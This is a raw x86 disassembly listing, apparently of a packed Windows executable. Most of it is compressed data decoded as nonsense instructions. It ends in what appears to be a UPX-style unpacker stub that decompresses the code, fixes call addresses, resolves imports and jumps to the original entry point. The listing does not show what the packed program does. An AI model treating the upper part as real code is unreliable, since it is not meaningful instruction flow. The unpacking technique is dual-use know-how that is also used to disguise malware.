  43c78a:	sub    eax,DWORD PTR [ecx+0x74]
  43c78d:	js     0x43c7f1
  43c78f:	jne    0x43c779
  43c791:	jae    0x43c7b4
  43c793:	pusha  
  43c794:	or     ecx,DWORD PTR [ecx-0x21edf200]
  43c79a:	mov    bl,0x76
  43c79c:	ret    
  43c79d:	popa   
  43c79e:	push   es
  43c79f:	outs   dx,DWORD PTR ds:[esi]
  43c7a0:	jb     0x43c80f
  43c7a2:	push   es
  43c7a3:	cmovae edx,DWORD PTR [eax+0x50]
  43c7a7:	adc    dh,BYTE PTR [ebx+0x410ac6d6]
  43c7ad:	or     eax,DWORD PTR [edi]
  43c7af:	sbb    esp,DWORD PTR [ecx+0x6ffb9a25]
  43c7b5:	xor    al,BYTE PTR [ebp+0x6e]
  43c7b8:	jne    0x43c827
  43c7ba:	inc    ebx
  43c7bb:	jbe    0x43c757
  43c7bd:	test   eax,0x66e6c253
  43c7c2:	jp     0x43c7d6
  43c7c4:	inc    edx
  43c7c5:	jb     0x43c7dd
  43c7c7:	inc    esp
  43c7c8:	sub    eax,0x65b612b1
  43c7cd:	and    al,0x74
  43c7cf:	sub    eax,0xc3966df4
  43c7d4:	or     DWORD PTR [ebp+0x4111827c],ebp
  43c7da:	nop
  43c7db:	rol    BYTE PTR [eax],0xb5
  43c7de:	mov    ch,0x78
  43c7e0:	push   esp
  43c7e1:	push   ss
  43c7e2:	and    al,0x74
  43c7e4:	pop    eax
  43c7e5:	xchg   edx,eax
  43c7e6:	das    
  43c7e7:	push   ss
  43c7e8:	hlt    
  43c7e9:	or     al,0x47
  43c7eb:	xlat   BYTE PTR ds:[ebx]
  43c7ec:	pushf  
  43c7ed:	lods   eax,DWORD PTR ds:[esi]
  43c7ee:	test   dh,dh
  43c7f0:	inc    ecx
  43c7f1:	ins    BYTE PTR es:[edi],dx
  43c7f2:	ins    BYTE PTR es:[edi],dx
  43c7f3:	push   es
  43c7f4:	sbb    al,0x40
  43c7f6:	add    al,0x16
  43c7f8:	or     BYTE PTR [ecx],ah
  43c7fa:	in     al,dx
  43c7fb:	jo     0x43c7cc
  43c7fd:	xor    BYTE PTR [edx],al
  43c7ff:	and    esp,ecx
  43c801:	mov    bl,0xe5
  43c803:	and    al,0x2f
  43c805:	pop    eax
  43c806:	mov    dl,0x43
  43c808:	cmp    eax,0x219f930c
  43c80d:	sbb    BYTE PTR [ebx],ch
  43c80f:	jnp    0x43c829
  43c811:	stos   BYTE PTR es:[edi],al
  43c812:	pop    ss
  43c813:	pop    eax
  43c814:	mov    WORD PTR [edi+0x45],es
  43c817:	xor    DWORD PTR [ecx+0x76d85e1b],edi
  43c81d:	sbb    al,0x49
  43c81f:	sub    DWORD PTR fs:[ecx+0x64],0x540b6866
  43c827:	outs   dx,DWORD PTR ds:[esi]
  43c828:	dec    ebp
  43c829:	cmp    DWORD PTR [edx],ebp
  43c82b:	mov    dl,dh
  43c82d:	iret   
  43c82e:	and    DWORD PTR fs:[ebx],ecx
  43c831:	scas   al,BYTE PTR es:[edi]
  43c832:	dec    ebp
  43c833:	mov    dl,0x28
  43c835:	push   ebx
  43c836:	inc    esp
  43c837:	arpl   WORD PTR [ebx+0x7d],di
  43c83a:	jns    0x43c849
  43c83c:	imul   ecx,ecx,0xc
  43c83f:	popa   
  43c840:	and    BYTE PTR [ebx],ch
  43c842:	xor    eax,0xa14286b3
  43c847:	adc    al,0x22
  43c849:	inc    ebx
  43c84a:	xchg   DWORD PTR [ecx+0x9],eax
  43c84d:	mov    dh,0xe0
  43c84f:	push   0x797063ef
  43c854:	or     al,BYTE PTR [eax+0x2072f278]
  43c85a:	or     ebp,ebx
  43c85c:	inc    eax
  43c85d:	(bad)  
  43c85e:	jns    0x43c7ed
  43c860:	popa   
  43c861:	mov    esi,0xb656bd70
  43c866:	add    cl,BYTE PTR [esi+edi*2-0x28c90f49]
  43c86d:	lock adc eax,0x93486def
  43c873:	outs   dx,BYTE PTR ds:[esi]
  43c874:	ss call 0xc9e:0x25ec1723
  43c87c:	xor    al,BYTE PTR [ebx]
  43c87e:	push   ss
  43c87f:	into   
  43c880:	data16 adc al,0x21
  43c883:	stos   BYTE PTR es:[edi],al
  43c884:	cmovae edi,DWORD PTR [edx]
  43c887:	jae    0x43c8a9
  43c889:	mov    ebp,0xbba5e6d8
  43c88e:	imul   edx,DWORD PTR [ebp+0x1111aa91],0x6e557d8d
  43c898:	push   0xcded6495
  43c89d:	loopne 0x43c825
  43c89f:	icebp  
  43c8a0:	pop    ss
  43c8a1:	leave  
  43c8a2:	sbb    DWORD PTR [edx+0x74],edx
  43c8a5:	ins    BYTE PTR es:[edi],dx
  43c8a6:	sbb    al,0x29
  43c8a8:	pop    ecx
  43c8a9:	fstp   TBYTE PTR [ecx+0x610a4177]
  43c8af:	imul   eax,DWORD PTR [ebx+0x20],0x1b37776e
  43c8b6:	or     ebp,DWORD PTR [edi]
  43c8b8:	stc    
  43c8b9:	jo     0x43c8bd
  43c8bb:	add    DWORD PTR [esi],esp
  43c8bd:	gs addr16 inc esi
  43c8c0:	xor    eax,0x5f1bf679
  43c8c5:	jae    0x43c92f
  43c8c7:	dec    ebx
  43c8c8:	gs jns 0x43c8e0
  43c8cb:	mov    al,ds:0xc43bf601
  43c8d0:	mov    BYTE PTR [eax],cl
  43c8d2:	jnp    0x43c916
  43c8d4:	adc    DWORD PTR [edi+0x70],ecx
  43c8d7:	fmul   DWORD PTR [esi+0x26b986c5]
  43c8dd:	push   cs
  43c8de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c8df:	ss push es
  43c8e1:	add    DWORD PTR [edi+0x4cd9dcf0],eax
  43c8e7:	and    BYTE PTR [ebx+0x24],0x21
  43c8eb:	push   edi
  43c8ec:	sbb    DWORD PTR [ecx+0x131a6cd3],esi
  43c8f2:	mov    BYTE PTR [esi-0x2932c511],bh
  43c8f8:	mov    edx,0x1b1d6505
  43c8fd:	sbb    eax,0x2985154c
  43c902:	and    al,al
  43c904:	test   al,0x2a
  43c906:	outs   dx,BYTE PTR ds:[esi]
  43c907:	pop    ds
  43c908:	xchg   BYTE PTR [eax+0x19],dl
  43c90b:	dec    edi
  43c90c:	data16 jnp 0x43c8fe
  43c90f:	add    dh,dh
  43c911:	pop    eax
  43c912:	adc    al,0x54
  43c914:	push   ebp
  43c915:	inc    edx
  43c916:	outs   dx,DWORD PTR ds:[esi]
  43c917:	jne    0x43c8ec
  43c919:	adc    eax,DWORD PTR [edi+0x4c03923b]
  43c91f:	inc    ebx
  43c920:	push   ebp
  43c921:	cmp    al,0x36
  43c923:	xchg   edx,eax
  43c924:	add    BYTE PTR [eax+0x2dad1244],ah
  43c92a:	imul   ebx,DWORD PTR [edi+ebp*2+0x1e],0xc
  43c92f:	mov    ds:0x8f677a08,eax
  43c934:	fs or  eax,0xffb091f3
  43c93a:	sub    eax,0x97983b36
  43c93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c940:	scas   eax,DWORD PTR es:[edi]
  43c941:	push   cs
  43c942:	lock mov esi,DWORD PTR [ebp+0x11d018b3]
  43c949:	dec    esp
  43c94a:	jecxz  0x43c960
  43c94c:	adc    bl,bl
  43c94e:	shr    DWORD PTR [ebx+ecx*1-0x2f],cl
  43c952:	sub    bh,BYTE PTR [eax+0x4f]
  43c955:	pop    esp
  43c956:	push   ebp
  43c957:	jne    0x43c8f3
  43c959:	in     eax,dx
  43c95a:	ret    0x4249
  43c95d:	push   esi
  43c95e:	jns    0x43c9b7
  43c960:	adc    al,0x35
  43c962:	xor    al,0x66
  43c964:	rcr    eax,0x82
  43c967:	ds mov bh,0x78
  43c96a:	mov    ds:0x566d7439,al
  43c96f:	xor    esp,DWORD PTR [ecx]
  43c971:	das    
  43c972:	and    dl,BYTE PTR [edx]
  43c974:	arpl   cx,bp
  43c976:	push   ebp
  43c977:	clc    
  43c978:	xor    ch,ch
  43c97a:	fmul   QWORD PTR [esi+0x6]
  43c97d:	mov    ds,WORD PTR ds:0x3b6cef70
  43c983:	dec    edi
  43c984:	sbb    al,0x41
  43c986:	dec    ebx
  43c987:	mov    WORD PTR [eax+0x77b21631],fs
  43c98d:	imul   edi,DWORD PTR [edx+0x62],0x44
  43c991:	jb     0x43c9f7
  43c993:	loop   0x43c9e4
  43c995:	imul   eax,DWORD PTR [esi+0x4a12cb63],0x75455000
  43c99f:	lods   al,BYTE PTR ds:[esi]
  43c9a0:	mov    esi,0x19ec1000
  43c9a5:	pop    esi
  43c9a6:	inc    edx
  43c9a7:	sub    bl,BYTE PTR [edi+0x3a]
  43c9aa:	aaa    
  43c9ab:	idiv   DWORD PTR [edi]
  43c9ad:	loopne 0x43c9af
  43c9af:	pop    DWORD PTR [ecx+0x1902010b]
  43c9b5:	or     BYTE PTR [edx],dl
  43c9b7:	outs   dx,BYTE PTR ds:[esi]
  43c9b8:	add    bl,cl
  43c9ba:	xlat   BYTE PTR ds:[ebx]
  43c9bb:	ins    DWORD PTR es:[edi],dx
  43c9bc:	mov    ?,ebp
  43c9be:	add    BYTE PTR [eax],dl
  43c9c0:	add    esi,eax
  43c9c2:	or     eax,0xac20b40
  43c9c7:	sub    BYTE PTR [edx-0x21c0fbe6],bh
  43c9cd:	pop    ecx
  43c9ce:	xchg   edx,eax
  43c9cf:	pop    ebx
  43c9d0:	or     al,0xb0
  43c9d2:	add    edi,DWORD PTR [ecx]
  43c9d4:	adc    BYTE PTR [esi],ch
  43c9d6:	add    eax,0x7ce764b
  43c9db:	adc    BYTE PTR [esi],al
  43c9dd:	or     al,0xca
  43c9df:	jmp    0x709:0x3cbebba5
  43c9e6:	pusha  
  43c9e7:	lods   al,BYTE PTR ds:[esi]
  43c9e8:	dec    ecx
  43c9e9:	add    ah,dl
  43c9eb:	pusha  
  43c9ec:	sbb    ecx,DWORD PTR [eax-0x2]
  43c9ef:	inc    eax
  43c9f0:	add    DWORD PTR [eax],eax
  43c9f2:	push   esp
  43c9f3:	adc    DWORD PTR [eax],esi
  43c9f5:	pop    ds
  43c9f6:	sbb    BYTE PTR [ebx+esi*8-0x55],ch
  43c9fa:	adc    BYTE PTR [eax],bl
  43c9fc:	inc    ebx
  43c9fd:	dec    edi
  43c9fe:	inc    esp
  43c9ff:	inc    ebp
  43ca00:	in     al,dx
  43ca01:	fist   WORD PTR [eax+0x17d85ddc]
  43ca07:	jmp    0x43ca0d
  43ca09:	and    esp,DWORD PTR [eax]
  43ca0b:	xchg   ebp,eax
  43ca0c:	inc    esp
  43ca0d:	inc    ecx
  43ca0e:	push   esp
  43ca0f:	xchg   edx,eax
  43ca10:	outs   dx,BYTE PTR ds:[esi]
  43ca11:	mov    al,0x23
  43ca13:	sub    DWORD PTR [eax*1-0x1b5df905],edx
  43ca1a:	repnz sbb al,0xf9
  43ca1d:	push   ss
  43ca1e:	jbe    0x43c9e0
  43ca20:	inc    edx
  43ca21:	push   ebx
  43ca22:	push   ebx
  43ca23:	inc    ecx
  43ca24:	or     BYTE PTR [ecx],al
  43ca26:	sbb    ebp,DWORD PTR [ebp-0x3f158dad]
  43ca2c:	cs stos BYTE PTR es:[edi],al
  43ca2e:	xchg   esi,eax
  43ca2f:	popa   
  43ca30:	out    0x4a,eax
  43ca32:	mov    edx,0x10f300b3
  43ca37:	daa    
  43ca38:	or     al,BYTE PTR [eax+0x6]
  43ca3b:	mov    edi,DWORD PTR [ebx+ecx*2-0x46]
  43ca3f:	jae    0x43c9c9
  43ca41:	or     BYTE PTR [edi-0xc],cl
  43ca44:	out    0x3b,al
  43ca46:	sbb    DWORD PTR [eax+0x72],eax
  43ca49:	sbb    BYTE PTR [edi],ah
  43ca4b:	xor    BYTE PTR [ecx+0x292b965],al
  43ca51:	inc    eax
  43ca52:	push   eax
  43ca53:	and    BYTE PTR gs:[eax],0x4d
  43ca57:	ja     0x43ca1b
  43ca59:	dec    ebx
  43ca5a:	inc    eax
  43ca5b:	daa    
  43ca5c:	adc    dh,dh
  43ca5e:	ins    BYTE PTR es:[edi],dx
  43ca5f:	cwde   
  43ca60:	loopne 0x43ca80
  43ca62:	jae    0x43cad6
  43ca64:	mov    edx,DWORD PTR es:[ebx+0x14174a00]
  43ca6b:	sub    ebx,ebx
  43ca6d:	or     BYTE PTR [ecx],al
  43ca6f:	daa    
  43ca70:	jge    0x43cab2
  43ca72:	or     DWORD PTR [edx+0x1712906f],esp
  43ca78:	cld    
  43ca79:	mov    DWORD PTR [eax],eax
  43ca7b:	add    BYTE PTR [eax],al
  43ca7d:	add    BYTE PTR [eax],al
  43ca7f:	add    BYTE PTR [eax],ah
  43ca81:	add    edi,edi
	...
  43ca8f:	add    BYTE PTR [eax-0x42],ah
  43ca92:	add    BYTE PTR [eax+0x41],dl
  43ca95:	add    BYTE PTR [ebp-0x13fff42],cl
  43ca9b:	call   DWORD PTR [edi-0x15]
  43ca9e:	or     edx,DWORD PTR [eax-0x77b9f976]
  43caa4:	pop    es
  43caa5:	inc    edi
  43caa6:	add    ebx,ebx
  43caa8:	jne    0x43cab1
  43caaa:	mov    ebx,DWORD PTR [esi]
  43caac:	sub    esi,0xfffffffc
  43caaf:	adc    ebx,ebx
  43cab1:	jb     0x43caa0
  43cab3:	mov    eax,0x1
  43cab8:	add    ebx,ebx
  43caba:	jne    0x43cac3
  43cabc:	mov    ebx,DWORD PTR [esi]
  43cabe:	sub    esi,0xfffffffc
  43cac1:	adc    ebx,ebx
  43cac3:	adc    eax,eax
  43cac5:	add    ebx,ebx
  43cac7:	jae    0x43cab8
  43cac9:	jne    0x43cad4
  43cacb:	mov    ebx,DWORD PTR [esi]
  43cacd:	sub    esi,0xfffffffc
  43cad0:	adc    ebx,ebx
  43cad2:	jae    0x43cab8
  43cad4:	xor    ecx,ecx
  43cad6:	sub    eax,0x3
  43cad9:	jb     0x43cae8
  43cadb:	shl    eax,0x8
  43cade:	mov    al,BYTE PTR [esi]
  43cae0:	inc    esi
  43cae1:	xor    eax,0xffffffff
  43cae4:	je     0x43cb5a
  43cae6:	mov    ebp,eax
  43cae8:	add    ebx,ebx
  43caea:	jne    0x43caf3
  43caec:	mov    ebx,DWORD PTR [esi]
  43caee:	sub    esi,0xfffffffc
  43caf1:	adc    ebx,ebx
  43caf3:	adc    ecx,ecx
  43caf5:	add    ebx,ebx
  43caf7:	jne    0x43cb00
  43caf9:	mov    ebx,DWORD PTR [esi]
  43cafb:	sub    esi,0xfffffffc
  43cafe:	adc    ebx,ebx
  43cb00:	adc    ecx,ecx
  43cb02:	jne    0x43cb24
  43cb04:	inc    ecx
  43cb05:	add    ebx,ebx
  43cb07:	jne    0x43cb10
  43cb09:	mov    ebx,DWORD PTR [esi]
  43cb0b:	sub    esi,0xfffffffc
  43cb0e:	adc    ebx,ebx
  43cb10:	adc    ecx,ecx
  43cb12:	add    ebx,ebx
  43cb14:	jae    0x43cb05
  43cb16:	jne    0x43cb21
  43cb18:	mov    ebx,DWORD PTR [esi]
  43cb1a:	sub    esi,0xfffffffc
  43cb1d:	adc    ebx,ebx
  43cb1f:	jae    0x43cb05
  43cb21:	add    ecx,0x2
  43cb24:	cmp    ebp,0xfffff300
  43cb2a:	adc    ecx,0x1
  43cb2d:	lea    edx,[edi+ebp*1]
  43cb30:	cmp    ebp,0xfffffffc
  43cb33:	jbe    0x43cb44
  43cb35:	mov    al,BYTE PTR [edx]
  43cb37:	inc    edx
  43cb38:	mov    BYTE PTR [edi],al
  43cb3a:	inc    edi
  43cb3b:	dec    ecx
  43cb3c:	jne    0x43cb35
  43cb3e:	jmp    0x43caa6
  43cb43:	nop
  43cb44:	mov    eax,DWORD PTR [edx]
  43cb46:	add    edx,0x4
  43cb49:	mov    DWORD PTR [edi],eax
  43cb4b:	add    edi,0x4
  43cb4e:	sub    ecx,0x4
  43cb51:	ja     0x43cb44
  43cb53:	add    edi,ecx
  43cb55:	jmp    0x43caa6
  43cb5a:	pop    esi
  43cb5b:	mov    edi,esi
  43cb5d:	mov    ecx,0x67c
  43cb62:	mov    al,BYTE PTR [edi]
  43cb64:	inc    edi
  43cb65:	sub    al,0xe8
  43cb67:	cmp    al,0x1
  43cb69:	ja     0x43cb62
  43cb6b:	cmp    BYTE PTR [edi],0x6
  43cb6e:	jne    0x43cb62
  43cb70:	mov    eax,DWORD PTR [edi]
  43cb72:	mov    bl,BYTE PTR [edi+0x4]
  43cb75:	shr    ax,0x8
  43cb79:	rol    eax,0x10
  43cb7c:	xchg   ah,al
  43cb7e:	sub    eax,edi
  43cb80:	sub    bl,0xe8
  43cb83:	add    eax,esi
  43cb85:	mov    DWORD PTR [edi],eax
  43cb87:	add    edi,0x5
  43cb8a:	mov    al,bl
  43cb8c:	loop   0x43cb67
  43cb8e:	lea    edi,[esi+0x3a000]
  43cb94:	mov    eax,DWORD PTR [edi]
  43cb96:	or     eax,eax
  43cb98:	je     0x43cbd6
  43cb9a:	mov    ebx,DWORD PTR [edi+0x4]
  43cb9d:	lea    eax,[eax+esi*1+0x3c234]
  43cba4:	add    ebx,esi
  43cba6:	push   eax
  43cba7:	add    edi,0x8
  43cbaa:	call   DWORD PTR [esi+0x3c2d4]
  43cbb0:	xchg   ebp,eax
  43cbb1:	mov    al,BYTE PTR [edi]
  43cbb3:	inc    edi
  43cbb4:	or     al,al
  43cbb6:	je     0x43cb94
  43cbb8:	mov    ecx,edi
  43cbba:	push   edi
  43cbbb:	dec    eax
  43cbbc:	repnz scas al,BYTE PTR es:[edi]
  43cbbe:	push   ebp
  43cbbf:	call   DWORD PTR [esi+0x3c2d8]
  43cbc5:	or     eax,eax
  43cbc7:	je     0x43cbd0
  43cbc9:	mov    DWORD PTR [ebx],eax
  43cbcb:	add    ebx,0x4
  43cbce:	jmp    0x43cbb1
  43cbd0:	call   DWORD PTR [esi+0x3c2e8]
  43cbd6:	mov    ebp,DWORD PTR [esi+0x3c2dc]
  43cbdc:	lea    edi,[esi-0x1000]
  43cbe2:	mov    ebx,0x1000
  43cbe7:	push   eax
  43cbe8:	push   esp
  43cbe9:	push   0x4
  43cbeb:	push   ebx
  43cbec:	push   edi
  43cbed:	call   ebp
  43cbef:	lea    eax,[edi+0x21f]
  43cbf5:	and    BYTE PTR [eax],0x7f
  43cbf8:	and    BYTE PTR [eax+0x28],0x7f
  43cbfc:	pop    eax
  43cbfd:	push   eax
  43cbfe:	push   esp
  43cbff:	push   eax
  43cc00:	push   ebx
  43cc01:	push   edi
  43cc02:	call   ebp
  43cc04:	pop    eax
  43cc05:	popa   
  43cc06:	lea    eax,[esp-0x80]
  43cc0a:	push   0x0
  43cc0c:	cmp    esp,eax
  43cc0e:	jne    0x43cc0a
  43cc10:	sub    esp,0xffffff80
  43cc13:	jmp    0x40ee5c
  43cc18:	xor    ah,cl
  43cc1a:	inc    ebx
  43cc1b:	add    BYTE PTR [eax],bh
  43cc1d:	int3   
  43cc1e:	inc    ebx
  43cc1f:	add    BYTE PTR [eax+0x40f0],bl
	...
